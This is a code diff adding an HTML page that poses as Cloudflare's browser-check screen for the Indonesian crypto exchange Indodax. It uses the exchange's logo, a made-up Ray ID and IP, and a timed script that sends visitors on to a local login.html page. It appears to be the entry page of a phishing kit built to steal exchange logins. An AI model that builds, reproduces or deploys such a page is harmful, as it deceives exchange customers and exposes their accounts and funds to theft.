@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Indodax - Checking Browser</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 40px;
+            background: #fff;
+            color: #000;
+        }
+        .logo-img {
+            width: 220px; /* ukuran logo disesuaikan */
+            margin-bottom: 10px;
+        }
+        .tagline {
+            font-weight: 600;
+            font-size: 14px;
+            color: #666;
+            letter-spacing: 1.5px;
+            margin-bottom: 40px;
+        }
+        .coin-container {
+            margin-bottom: 40px;
+            position: relative;
+            height: 150px;
+        }
+        /* Ganti icon ₿ dengan gambar koin */
+        .coin {
+            position: absolute;
+            user-select: none;
+        }
+        .coin.large {
+            width: 120px;
+            height: 120px;
+            left: 50%;
+            top: 20px;
+            transform: translateX(-50%);
+        }
+        .coin.small {
+            width: 60px;
+            height: 60px;
+            left: 30%;
+            top: 80px;
+        }
+        .message {
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 15px;
+        }
+        .sub-message {
+            font-size: 14px;
+            color: #333;
+            margin-bottom: 15px;
+        }
+        .blue-link {
+            color: #007bff;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .blue-link:hover {
+            text-decoration: underline;
+        }
+        .verification {
+            margin-top: 40px;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #444;
+        }
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #007bff;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            margin-right: 10px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg);}
+            100% { transform: rotate(360deg);}
+        }
+        .cloudflare {
+            margin-left: 10px;
+            font-weight: bold;
+            color: #ff8000;
+            font-family: Arial, sans-serif;
+        }
+        .footer {
+            margin-top: 30px;
+            font-size: 12px;
+            color: #999;
+        }
+        .footer a {
+            color: #666;
+            text-decoration: none;
+            margin: 0 5px;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+
+    <script>
+        // Redirect otomatis ke login.html setelah 5 detik
+        setTimeout(function() {
+            window.location.href = "login.html";
+        }, 5000);
+    </script>
+</head>
+<body>
+    <!-- Logo utama -->
+    <img src="https://uploads.onecompiler.io/43vfc6dh5/443ve8w7d/1000026599.png" alt="Indodax Logo" class="logo-img" />
+    <div class="tagline">INDONESIA BITCOIN AND CRYPTO EXCHANGE</div>
+
+    <div class="coin-container">
+        <!-- Ganti icon koll dengan gambar -->
+        <img src="https://uploads.onecompiler.io/43vfc6dh5/443ve8w7d/1000026598.png" alt="Bitcoin Coin Large" class="coin large" />
+        <img src="https://uploads.onecompiler.io/43vfc6dh5/443ve8w7d/1000026598.png" alt="Bitcoin Coin Small" class="coin small" />
+    </div>
+
+    <div class="message">Checking your browser before accessing indodax.com</div>
+    <div class="sub-message">
+        This process is automatic. Your browser will redirect to your request content shortly.<br />
+        Please allow up to 5 seconds...
+    </div>
+    <a href="https://www.cloudflare.com" class="blue-link" target="_blank" rel="noopener noreferrer">DDoS protection by CloudFlare</a>
+
+    <div class="verification">
+        <div class="spinner"></div>
+        Melakukan verifikasi...
+        <div class="cloudflare">CLOUDFLARE</div>
+    </div>
+
+    <div class="footer">
+        Ray ID: 99a63ecb785fc649 IP: 140.213.76.124<br/>
+        <a href="#">Privasi</a> · <a href="#">Syarat</a>
+    </div>
+</body>
+</html>
